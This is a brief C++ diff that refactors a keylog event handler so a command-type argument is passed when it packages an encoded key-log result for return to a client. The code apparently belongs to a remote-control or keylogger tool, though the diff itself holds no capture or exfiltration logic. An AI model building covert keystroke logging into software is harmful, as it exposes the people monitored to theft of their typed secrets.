@@ -21,7 +21,8 @@ std::unique_ptr<IRequest> KeyLogEventHandler::handle(std::shared_ptr<EventInfo> 
 	const std::string generated_command_id = uuid::generate_uuid();
 	return std::make_unique<ReturnProductRequest>(
 		RequestHeader{RequestType::ReturnEventProduct, client_id},
-		std::make_unique<ReturnEventProduct>(std::make_unique<KeyLogProduct>(generated_command_id, encoded_result),
-		                                     std::move(event_info))
+		std::make_unique<ReturnEventProduct>(
+			std::make_unique<KeyLogProduct>(generated_command_id, CommandType::KeyLog, encoded_result),
+			std::move(event_info))
 	);
 }
